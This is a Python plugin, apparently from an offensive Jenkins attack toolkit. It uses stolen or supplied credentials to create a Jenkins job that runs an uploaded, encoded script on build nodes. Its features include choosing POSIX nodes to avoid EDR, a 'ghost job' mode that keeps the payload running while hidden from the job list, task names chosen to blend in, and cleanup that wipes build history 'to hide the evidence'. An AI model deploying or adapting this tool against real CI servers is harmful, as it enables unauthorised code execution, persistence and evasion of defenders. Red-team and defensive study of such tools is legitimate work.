import base64
import os
import random
import string
import time
import xml.sax.saxutils
import zlib

import requests.exceptions as req_exc

from libs import jenkinslib, quik

from .BasePlugin import BasePlugin, HijackStdOut


def xmlescape(data):
    return xml.sax.saxutils.escape(data, {'"': "&quot;"})


class NonCriticalException(Exception):
    pass


class RunJob(BasePlugin):
    """Class for managing RunJob SubCommand"""

    template_cache = None

    def __init__(self, args):
        super().__init__(args)

        state = 1

        try:
            cred = self.args.credentials[0]
            server = self._get_jenkins_server(cred)

            if not server.can_create_job():
                self.logging.fatal(
                    "%s: Is not a valid Jenkins user with job creation access or unable to access Jenkins server.",
                    self._get_username(cred),
                )

                return

            # Step 1: Get a list of online jenkins nodes

            posix_nodes = []
            windows_nodes = []
            other_nodes = []

            if self.args.node:
                if self.args.node_type == "posix":
                    posix_nodes = [{"name": self.args.node}]
                else:
                    windows_nodes = [{"name": self.args.node}]

            else:
                nodes = [x for x in server.get_nodes() if not x["offline"]]

                if len(nodes) == 0:
                    raise NonCriticalException("No online nodes were discovered.")

                """
                We need to try to divide nodes up by type because our payload will change.
                If unknown, chances are it is some flavor of POSIX compatible OS with python so we can
                attempt POSIX payload as a last resort if nothing else is available. Also, for some reason master is
                not shown on the nodes page so we can't get the architecture. In most cases the master will be posix compliant anyway.
                In most cases, if execution on the master is denied, that means there will be more than one slave.
                """

                for node in nodes:
                    if node["architecture"] and "windows" in node["architecture"].lower():
                        windows_nodes.append(node)
                    elif (
                        any(
                            node["architecture"] and x in node["architecture"].lower()
                            for x in ["nix", "nux", "bsd", "osx"]
                        )
                        or node["name"] == "master"
                    ):
                        posix_nodes.append(node)
                    else:
                        other_nodes.append(node)

            state += 1

            """
            Step 2: We determine where we are going to try to run this payload and fabricate the payload.
            We want to prioritize posix due to less chance of EDR, and more efficient payload design.
            We want to pick our execution location in this order posix -> windows -> other.
            """

            job = None
            job_type = None
            run_nodes = None

            if len(posix_nodes) > 0:
                job_type = "posix"
                run_nodes = posix_nodes

                cmd_string = self._posix_payload()
            elif len(windows_nodes) > 0:
                job_type = "windows"
                run_nodes = windows_nodes
                try:
                    cmd_string = self._windows_payload()
                except OSError:
                    raise NonCriticalException(
                        'Please compile "data/cpp/windows_ghost_job_helper.cpp" and drop the resulting "windows_ghost_job_helper.exe" into "data/exe/", then retry.'
                    )
            elif len(other_nodes) > 0:
                job_type = "posix"
                run_nodes = other_nodes
                cmd_string = self._posix_payload()
            else:
                raise NonCriticalException("No nodes to execute on.")

            job = self._generate_job_xml(job_type, run_nodes, cmd_string)

            state += 1

            """
            Step 3: Create job
            """

            server.create_job(self.args.task_name, job)
            state += 1

            """
            Step 4: Start the job
            """

            server.build_job(self.args.task_name)
            state += 1

            """
            Step 5: Wait for the Results
            """

            if not self.args.no_wait:
                while True:
                    time.sleep(1)
                    try:
                        results = server.get_build_info(self.args.task_name, "lastBuild")
                        break
                    except jenkinslib.JenkinsException:
                        pass

                job_id = results["id"]

                if self.args.ghost:
                    time.sleep(3)
                else:
                    while results["building"]:
                        time.sleep(3)
                        results = server.get_build_info(self.args.task_name, "lastBuild")

            state += 1

            """
            Step 6: Retrieve Results or Terminate Job (Depending on options)
            """

            if not self.args.no_wait:
                if self.args.ghost:
                    server.stop_build(self.args.task_name, job_id)
                    with HijackStdOut():
                        print("Job should be successfully running.")
                else:
                    print(
                        server.get_build_console_output(
                            "job/" + self.args.task_name + "/", "lastBuild"
                        )
                    )
            else:
                with HijackStdOut():
                    print("Job should be successfully running.")

        except jenkinslib.JenkinsException as ex:
            if "[403]" in str(ex).split("\n")[0]:
                self.logging.fatal(
                    "%s authentication failed or no access", self._get_username(cred)
                )
            else:
                self.logging.fatal(
                    "Unable to access Jenkins at: %s With User: %s For Reason:\n\t%s"
                    % (
                        (
                            self.server_url.netloc
                            if len(self.server_url.netloc) > 0
                            else self.args.server
                        ),
                        self._get_username(cred),
                        str(ex).split("\n")[0],
                    )
                )

        except (req_exc.SSLError, req_exc.ConnectionError):
            self.logging.fatal(
                "Unable to connect to: "
                + (self.server_url.netloc if len(self.server_url.netloc) > 0 else self.args.server)
            )

        except NonCriticalException as ex:
            with HijackStdOut():
                print(str(ex))

        except Exception:
            self.logging.exception("")
            exit(1)

        finally:
            # Do Cleanup
            if self.args.no_wait:
                with HijackStdOut():
                    print(
                        "WARNING: Unable to delete the job, do to -x option.  You need to manually go do cleanup."
                    )
            elif state > 3:
                try:
                    server.delete_job(self.args.task_name)
                    return
                except (
                    jenkinslib.JenkinsException,
                    req_exc.SSLError,
                    req_exc.ConnectionError,
                    req_exc.HTTPError,
                ):
                    with HijackStdOut():
                        print(
                            "WARNING: Unable to delete the job, attempting secondary clean-up.  You should double check."
                        )

                # We were unable to delete the the task, so we need to do secondary clean-up as best we can:
                # First we delete all console output and run history:
                try:
                    server.delete_all_job_builds(self.args.task_name)
                except (
                    jenkinslib.JenkinsException,
                    req_exc.SSLError,
                    req_exc.ConnectionError,
                    req_exc.HTTPError,
                ):
                    print(
                        "WARNING: Unable to clean-up console output.  You should definitely try to do this yourself."
                    )

                # Second, overwrite the job with an empty job:
                try:
                    server.reconfig_job(
                        self.args.task_name,
                        "<?xml version='1.1' encoding='UTF-8'?><project></project>",
                    )
                except (
                    jenkinslib.JenkinsException,
                    req_exc.SSLError,
                    req_exc.ConnectionError,
                    req_exc.HTTPError,
                ):
                    print(
                        "WARNING: Unable to wipeout job to hide the evidence.  You should definitely try to do this yourself."
                    )

                # Third, attempt to disable the job:
                try:
                    server.disable_job(self.args.task_name)
                except (
                    jenkinslib.JenkinsException,
                    req_exc.SSLError,
                    req_exc.ConnectionError,
                    req_exc.HTTPError,
                ):
                    print(
                        "WARNING: Unable to disable job.  You should definitely try to do this yourself."
                    )

    def _posix_payload(self):
        file_name = "".join(random.choices(string.ascii_letters + string.digits, k=8))

        if "." in self.args.script_path:
            file_name += "." + self.args.script_path.split(".")[-1]

        with open(self.args.script_path, "rb") as f:
            payload = base64.b64encode(zlib.compress(f.read(), 9)).decode("utf8")

        if self.args.executor:
            executor = self.args.executor.replace("\\", "\\\\").replace('"', '\\"') + " "

        if self.args.additional_args:
            additional_args = " " + self.args.additional_args.replace("\\", "\\\\").replace(
                '"', '\\"'
            )

        loader = quik.FileLoader(os.path.join("data", "python"))

        if self.args.ghost:
            cmd_template = loader.load_template("posix_ghost_job_template.py")
        else:
            cmd_template = loader.load_template("posix_normal_job_template.py")

        return cmd_template.render(locals())

    def _windows_payload(self):
        file_name = "".join(random.choices(string.ascii_letters + string.digits, k=8))

        if "." in self.args.script_path:
            file_name += "." + self.args.script_path.split(".")[-1]

        with open(self.args.script_path, "rb") as f:
            data = base64.b64encode(f.read()).decode("utf8")

        payload = list(self.__chunk_payload(data, 240))

        if self.args.executor:
            executor = self.args.executor + " "

        if self.args.additional_args:
            additional_args = " " + self.args.additional_args

        loader = quik.FileLoader(os.path.join("data", "batch"))

        if self.args.ghost:
            helper_file_name = (
                "".join(random.choices(string.ascii_letters + string.digits, k=8)) + ".exe"
            )

            with open(os.path.join("data", "exe", "windows_ghost_job_helper.exe"), "rb") as f:
                data = base64.b64encode(f.read()).decode("utf8")

            helper_payload = list(self.__chunk_payload(data, 240))

            cmd_template = loader.load_template("windows_ghost_job_template.bat")
        else:
            cmd_template = loader.load_template("windows_normal_job_template.bat")

        return cmd_template.render(locals())

    def _generate_job_xml(self, job_type, nodes, cmd_string):
        job_template = quik.FileLoader(os.path.join("data", "xml")).load_template(
            "job_template.xml"
        )

        return job_template.render(
            {
                "job_type": "BatchFile" if job_type == "windows" else "Shell",
                "assigned_nodes": "({})".format(
                    xmlescape(" || ".join(['"{}"'.format(x["name"]) for x in nodes]))
                ),
                "commands": xmlescape(cmd_string),
            }
        )

    def __chunk_payload(self, payload, size):
        for i in range(0, len(payload), size):
            yield payload[i : i + size]


class RunJobParser:
    def cmd_RunJob(self):
        """Handles parsing of RunJob Subcommand arguments"""

        self._create_contextual_parser("RunJob", "Run Jenkins Jobs")
        self._add_common_arg_parsers()

        self.parser.add_argument(
            "-x",
            "--no_wait",
            help="Do not wait for Job. Cannot be specified if -g is passed",
            action="store_true",
            dest="no_wait",
            required=False,
        )

        self.parser.add_argument(
            "-g",
            "--ghost",
            help='Launch "ghost job", does not show up as a running job after initial launch, does not tie up executors, and runs indefinitely. Cannot be specified with the -x option.',
            action="store_true",
            dest="ghost",
            required=False,
        )

        self.parser.add_argument(
            "-N",
            "--node",
            metavar="<Node>",
            help="Node (Slave) to execute against. Executes against any available node if not specified.",
            action="store",
            dest="node",
            required=False,
        )

        self.parser.add_argument(
            "-T",
            "--nodetype",
            metavar="<Node Type>",
            help='Node Type, either: "posix" or "windows". If specified, you must also pass -N',
            choices=["posix", "windows"],
            dest="node_type",
            required=False,
        )

        self.parser.add_argument(
            "-e",
            "--executor",
            metavar="<Executor String>",
            help="If passed, this command string will be prepended to command string ([<Executor String>] <Executable File> [<Additional Arguments String>]).",
            action="store",
            dest="executor",
            required=False,
        )

        self.parser.add_argument(
            "-A",
            "--args",
            metavar="<Additional Arguments String>",
            help="If passed, this will be concatonated to the end of the command string ([<Executor String>] <Executable File> [<Additional Arguments String>]).",
            action="store",
            dest="additional_args",
            required=False,
        )

        self.parser.add_argument(
            metavar="<Task Name>",
            help="Task to Create, must be unique (may not be deleted if user doesn't have job deletion permissions, so pick something that blends in)",
            action="store",
            dest="task_name",
        )

        self.parser.add_argument(
            metavar="<Executable File>",
            help="Local path to script to upload and run.  Should be compatible with OS and with expected extension.",
            action="store",
            dest="script_path",
        )

        args = self.parser.parse_args()

        self._validate_server_url(args)
        self._validate_timeout_number(args)
        self._validate_output_file(args)

        return_data = self._handle_authentication(args)

        if not self._file_accessible(args.script_path):
            with HijackStdOut():
                self.parser.print_usage()
                print("\nError: Specified Script File does not exist or cannot be accessed.")
                exit(1)

        if args.no_wait and args.ghost:
            with HijackStdOut():
                self.parser.print_usage()
                print("\nError: Cannot specify both -g and -x at the same time.")
                exit(1)

        if not args.task_name or any(
            x not in (string.ascii_letters + string.digits + "/") for x in args.task_name
        ):
            with HijackStdOut():
                self.parser.print_usage()
                print(
                    "\nError: Task Name must be alphanumeric string with optional subfolder pathing via forward slashes."
                )
                exit(1)

        if (args.node and not args.node_type) or (args.node_type and not args.node):
            with HijackStdOut():
                self.parser.print_usage()
                print("\nError: You must either specify both Node and Node Type or neither")
                exit(1)

        return return_data
